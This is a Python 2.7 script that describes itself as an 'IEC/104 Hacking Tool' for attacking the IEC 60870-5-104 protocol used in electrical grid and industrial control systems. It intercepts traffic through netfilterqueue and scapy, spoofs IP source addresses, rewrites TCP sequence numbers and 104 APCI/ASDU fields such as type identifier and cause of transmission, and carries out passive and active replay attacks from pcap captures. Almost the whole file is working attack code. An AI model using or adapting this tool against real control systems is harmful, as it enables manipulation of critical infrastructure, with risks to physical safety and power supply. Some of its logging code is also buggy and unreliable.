#! /usr/bin/env python2.7
import sys
import socket
import time
from netfilterqueue import NetfilterQueue
from scapy.all import *

#104apdu script is python script which its purpose is to attack IEC 60870-5-104 protocol.
#to run this script, you need:
# 1- python : with version = 2.7
# 2- scapy : see official website: www.secdev.org/projects/scapy
# 3- netfilterQueue : see official website : https://github.com/kti/python-netfilterqueue

#List of parameters: IP/TCP/104apci  layers
values = {'IPS':-1,'IPD':-1,'TTL':-1,'SP':-1,'DP':-1,'SEQ':-1,'ACK':-1,'I':-1,'S':-1,'N':-1,'C':-1,'P':-1,'T':-1,'F':-1,'Q':-1, 'OPT':-1}

#print log

def printLog(packet):
    print "Packet from " + str(packet['IP'].src) +" [port : " + str(packet['TCP'].sport) + "]" + " to " + str(packet['IP'].dst) + " [port : " + str(packet['TCP'].dport) + "]" 
    print "Payload (APDU : hex format) :",
    try:
        #test if payload is null or not
        if((str(pkt['Raw'].load)).encode('hex')!= ""):
            print "NULL"
        else:
            print (str(pkt['Raw'].load)).encode('hex')
    except:
        print "NULL"

#modify function: change the TCP/IP payload of packet
def modify(packet,version = 0, option = 0):
    
    #get the payload of packet
    try:
        #packet from queue
    	pkt = IP(packet.get_payload())
    except:
        #packet from pcap file
	pkt = packet['IP']

    try:

        #modify IP/TCP packet payload
    	if (values['IPS'] != -1):
            #modify IP source address 
            pkt['IP'].src = values['IPS']
            
    	if(values['IPD'] != -1):
            #modify IP destination address
            pkt['IP'].dst = values['IPD']
            
    	if(values['TTL'] != -1):
            #modify TTL value
            pkt['IP'].ttl = values['TTL']
            
    	if(values['SP'] != -1):
            #modify port source 
            pkt['TCP'].sport = values['SP']
            
    	if(values['DP'] != -1):
            #modify port destination
            pkt['TCP'].dport = values['DP']
            
    	if(values['SEQ'] != -1):
            #modify sequence value
            pkt['TCP'].seq = values['SEQ']
            
    	if(values['ACK'] != -1):
            #modify acknowledgement value
	    pkt['TCP'].ack = values['ACK']

    	#modify the  104apci data 
    	payld = (str(pkt['Raw'].load)).encode('hex')

        #payld >= 13: a packet with full APDU payload (APCI + ASDU)
    	if (len (payld) >= 13):

           
            #modify type identifier
	    if(values['I'] != -1):
                payld =payld[:12] + "{:02x}".format(int(values['I'])) + payld[14:]
              
        
            #modify number of objects (N) and bit S 
	    byte1Part1 = int(payld[14:16], 16) >> 7 #bit S
	    byte1Part2 = int(payld[14:16], 16) & int('01111111',2) #number of objects N

	    #modify byte value
	    if(values['S'] != -1):
            	byte1Part1 = int(values['S'])
	    if(values['N'] != -1):
            	byte1Part2 = int(values['N'])
	    
	    payld = payld[:14] + "{:02x}".format(128 * byte1Part1 + byte1Part2)+ payld[16:]

	    #modify  values : 'C' , 'P' and 'T'
	    byte2Part1 = int(payld[16:18], 16) & int('00111111', 2) #cause of transmission
	    byte2Part2 = (int(payld[16:18], 16) & int('01000000', 2)) >> 6 #bit P/N
	    byte2Part3 = int(payld[16:17], 18) >> 7 #bit Test

	    #modify byte value
	    if(values['C'] != -1):
	    	byte2Part1 = int(values['C'])
	    if(values['P'] != -1):
	    	byte2Part2 = int(values['P'])
	    if(values['T'] != -1):
		byte2Part3 = int(values['T'])
	   
	    payld =payld[:16] + "{:02x}".format(128 * byte2Part3 + 64 * byte2Part2 + byte2Part1) + payld[18:]
	
    	pkt['Raw'].load = str(payld.decode('hex'))
    except:
	pass

        
    #delete checksum of  packet
    del pkt['TCP'].chksum
    del pkt['IP'].chksum

    #send packet
    if(option == 0):
	print " "
        send(pkt)
        #print log 
        printLog(pkt)
    else:
        return pkt
 

    #drop the original packet
    if(version == 0):
        packet.drop()


#netFilter function : read packet from queue
def netFilter(modify):
    nfqueue = NetfilterQueue()
    nfqueue.bind(int(values['Q']), modify)
    try:
	print "[***] 104 APCI hacking script"
	print "[***] Listening on  NFQUEUE " + str(int(values['Q']))
	print "[***] Waiting for data"
	nfqueue.run()
    except KeyboardInterrupt:
	print " "
	print "process terminated"	

#filePcap function: read from a pcap file
def filePcap(modify):
    try:
        #read pcap file
	file = rdpcap(values['F'])
        print "[***] 104 APCI hacking script"
        print "[***] Reading from PCAP file"
        print "[***] Launching Attack ..."
        
        if(values['OPT'] == 0):
            #passive replay attack
            #read packets array
            for pkt in file:
                try:
                    #modify packet
		    modify(pkt, 1, 0)
		except:
		    pass
	else:
            #active replay attack
            #create a new TCP connection
            try:
                packet_temp = modify(file[0], 1, 1)
		sport = packet_temp['TCP'].sport
                dport = packet_temp['TCP'].dport
                mysocket = socket.socket()
                mysocket.bind(("0.0.0.0", sport))
                mysocket.connect((packet_temp['IP'].dst, dport))
                mystream = StreamSocket(mysocket)
                ipSrc = socket.gethostbyname(socket.gethostname())
                for i in range(0, len(file)):
                    try:
                        load = packet_temp['TCP'].payload
                        mystream.send(load)
                        time.sleep(0.5)
                        packet_temp['IP'].src = ipSrc
                        printLog(packet_temp)
                        packet_temp = modify(file[i + 1], 1, 1)
                    except:
                        pass
            except:
                print "TCP connection refused"
    except:
	print "Exception : File not found "

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
#The main part
try:

        #show help option 
	if ((sys.argv[1] == "--help" or sys.argv[1]=="-h") and (len(sys.argv) == 2)):
		print bcolors.WARNING 
		print"       	 	    _  ___  _  _     _    ____  ____  _   _ "
		print"       		   / |/ _ \| || |   / \  |  _ \|  _ \| | | |"
		print"       		   | | | | | || |_ / _ \ | |_) | | | | | | |"
		print"       		   | | |_| |__   _/ ___ \|  __/| |_| | |_| |"
		print"       		   |_|\___/   |_|/_/   \_\_|   |____/ \___/ "
		print bcolors.ENDC
	 	print bcolors.OKGREEN
		print "	   		[---] IEC/104 Hacking Tool [---]"
		#print ""
		print bcolors.ENDC
		print bcolors.FAIL
		print "Standard Option:"
		print bcolors.ENDC
		print "  -h, --help             print usage summary"
		print ""
		print bcolors.FAIL
		print "Input Options:"
		print bcolors.ENDC
		print "  -f, --file             specify the pcap file"
		print "  -q, --queue            set the queue's number"
		print "  --option               set replay attack (0: passive, 1: active)"
		print ""
		print bcolors.FAIL
		print "###[ IP ]###"
		print bcolors.ENDC
		print "  -s, --source           spoof IP source address"
		print "  -d, --destination      define destination IP address"
		print "  -t, --ttl              define time to live parameter"
		print ""
		print bcolors.FAIL
		print "###[ APCI ]###"
		print bcolors.ENDC
		print "  -I, --typeID <ID>      use type identifier (range of numbers: 1 to 127)"
		print "  -S, --sq <0,1>         set the value of SQ bit"
		print "  -N, --number-Objects   set number of objects"
		print "  -C, --cot <ID>         set cause of transmission (range of numbers: 1 to 47)"
		print "  -P <0,1>               indicate positive or negative confirmation"
		print "  -T, --test             set the Test bit value" 	
	else:
		#Verify INPUT
		if(len(sys.argv) <= 1 or len(sys.argv) % 2 == 0):
			raise KeyboardInterrupt
 
		
		#values given by  User
		#update values array
		for x in range(1, len(sys.argv)-1, 2):
                    
                        #set the IP source
			if ((sys.argv[x] == "-s" or sys.argv[x] == "--source") and values['IPS'] == -1):
				socket.inet_aton(sys.argv[x+1])
				values['IPS'] = sys.argv[x+1]
				continue
			    
			#set the IP destination
			if ((sys.argv[x] == "-d" or sys.argv[x] == "--destination") and values['IPD'] == -1):
				socket.inet_aton(sys.argv[x+1])
				values['IPD'] = sys.argv[x+1]
				continue
			    
			#change the value of TTL (Time to live parameter)
			if ((sys.argv[x] == '-t' or sys.argv[x] == '--ttl') and values['TTL'] == -1):
				if ( (int(sys.argv[x+1]) >= 1) and (int (sys.argv[x+1]) <= 255)):
					values['TTL'] = int(sys.argv[x+1])
					continue
				else:
					raise KeyboardInterrupt
				    
			#change the source port
			if ((sys.argv[x] == '-sport')and values['SP'] == -1):
				if (int(sys.argv[x+1]) >= 1 and int(sys.argv[x+1]) <= 65535):
					values['SP'] = int(sys.argv[x+1])
					continue
				else:
					raise KeyboardInterrupt

			#change the destination port
			if ((sys.argv[x] == '-dport') and values['DP'] == -1):
				if (int(sys.argv[x+1]) >= 1 and int(sys.argv[x+1]) <= 65535):
					values['DP'] = int(sys.argv[x+1])
					continue
				else:
					raise KeyboardInterrupt

			#change sequence number
			if((sys.argv[x] == '-seq') and values['SEQ'] == -1):
				if (int(sys.argv[x+1]) >=0 ):
					values['SEQ'] =  int(sys.argv[x+1])
					continue
				else:
					raise KeyboardInterrupt

			#change acknowledgment number
			if ((sys.argv[x] == '-ack') and values['ACK'] == -1):
				if (int(sys.argv[x+1]) >= 0):	
					values['ACK'] = int(sys.argv[x+1])
					continue
				else:
					raise KeyboardInterrupt

			#change type identifier 
			if((sys.argv[x] == "-I" or sys.argv[x] == "--typeID") and values['I'] == -1):
				if(int(sys.argv[x+1])>= 1 and int(sys.argv[x+1]) <= 255):
					values['I'] = int(sys.argv[x+1])
					continue
				else:
					raise KeyboardInterrupt

			#change  SQ bit
			if((sys.argv[x] == "-S" or sys.argv[x] == "--sq") and values['S'] == -1):
				if(int(sys.argv[x+1]) == 0 or int(sys.argv[x+1]) == 1):
					values['S'] = int(sys.argv[x+1])
					continue
				else:
					raise KeyboardInterrupt

			#change the number of Objects
			if((sys.argv[x] == "-N" or sys.argv[x] == "--number-Objects") and values['N'] == -1):
				if(int (sys.argv[x+1]) >= 0 and int(sys.argv[x+1]) <= 127):
					values['N'] = int(sys.argv[x+1])
					continue
				else:
					raise KeyboardInterrupt

			#change the cause of transmission
			if((sys.argv[x]== "-C" or sys.argv[x] == "--cot") and values['C'] == -1):
				if(int(sys.argv[x+1]) >= 0 and int(sys.argv[x+1]) <= 63):
					values['C'] = int(sys.argv[x+1])
					continue
				else:
					raise KeyboardInterrupt

			#change  P bit
			if((sys.argv[x] == "-P") and values['P'] == -1):
				if(int(sys.argv[x+1])== 0 or int(sys.argv[x+1])== 1):
					values['P'] = int(sys.argv[x+1])
					continue
				else:
					raise KeyboardInterrupt

			#change Test bit
			if((sys.argv[x] == "-T" or sys.argv[x] == "--test")  and values['T'] == -1):
				if(int(sys.argv[x+1]) == 0 or int(sys.argv[x+1]) == 1):
					values['T'] = int(sys.argv[x+1])
					continue
				else:
					raise KeyboardInterrupt

                        #set  INPUT file
			if((sys.argv[x] == "-f" or sys.argv[x] == "--file") and values['F'] == -1):
                                values['F'] = sys.argv[x+1]
				print values['F']
                                continue

                        #set  QUEUE number
                        if((sys.argv[x] == "-q" or sys.argv[x] == "--queue") and values['Q'] == -1):
                               if(int(sys.argv[x+1]) >= 0 and int(sys.argv[x+1]) <= 65535):
                                   values['Q'] = int(sys.argv[x+1])
				   continue
                               else:
                                   raise KeyboardInterrupt

                        #set Option value
                        if(sys.argv[x] == "--option" and values['OPT'] == -1):
                            if(int(sys.argv[x+1]) == 0 or int(sys.argv[x+1]) == 1):
                                values['OPT'] = int(sys.argv[x+1])
				continue
                            else:
                                raise KeyboardInterrupt

                        #Unknown option
			raise KeyboardInterrupt

                #raise exception if there is a syntax error
		if ((values['F'] !=-1 and values['Q'] != -1) or (values['F'] == -1 and values['Q'] == -1)):
                    raise KeyboardInterrupt
            
                if(values['Q'] != -1 and values['OPT'] != -1):
                    raise KeyboardInterrupt

                if(values['F'] != -1 and values['OPT'] == -1):
                    raise KeyboardInterrupt

                if(values['OPT']!= -1 and (values['IPS'] != -1  or values['TTL']!= -1 or values['SEQ'] != -1 or values['ACK'] != -1)):
                    raise KeyboardInterrupt

                #set INPUT option
                if(values['F'] != -1):
                    INPUT = 'f'
                else:
                    INPUT = 'q'

                #run script
                try:
                    if(INPUT == 'q'):
                            netFilter(modify)
                    else:
                            filePcap(modify)
                except:
                    print "Unexpected error: Script has been stopped due to fatal error"
except:
	print "Unexpected error : ", "Syntax error"
	print sys.exc_info()[0]
	print sys.exc_traceback.tb_lineno
